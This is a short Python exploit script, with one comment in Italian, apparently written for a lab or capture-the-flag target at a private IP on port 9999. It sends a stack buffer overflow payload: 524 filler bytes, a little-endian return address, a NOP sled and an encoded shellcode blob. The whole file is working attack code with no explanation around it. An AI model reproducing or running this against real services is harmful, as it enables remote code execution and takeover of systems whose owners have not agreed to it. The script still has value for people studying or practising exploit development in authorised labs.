#!/usr/bin/python
import sys, socket
from time import sleep

overflow = (
"\xbd\xeb\x83\xc8\x10\xd9\xcd\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x12\x31\x68\x12\x83\xc0\x04\x03\x83\x8d\x2a\xe5\x62\x49\x5d"
"\xe5\xd7\x2e\xf1\x80\xd5\x39\x14\xe4\xbf\xf4\x57\x96\x66\xb7"
"\x67\x54\x18\xfe\xee\x9f\x70\x0b\x19\xf3\x04\x63\x1b\xf3\x11"
"\xc7\x92\x12\xa9\x41\xf5\x85\x9a\x3e\xf6\xac\xfd\x8c\x79\xfc"
"\x95\x60\x55\x72\x0d\x15\x86\x5b\xaf\x8c\x51\x40\x7d\x1c\xeb"
"\x66\x31\xa9\x26\xe8")

# dopo i 524 bytes ci dobbiamo scrivere l'indirizzo  311712f3 "al contrario" (Little Endian)
shellcode = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.10.237.189',9999))
	s.send((shellcode))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
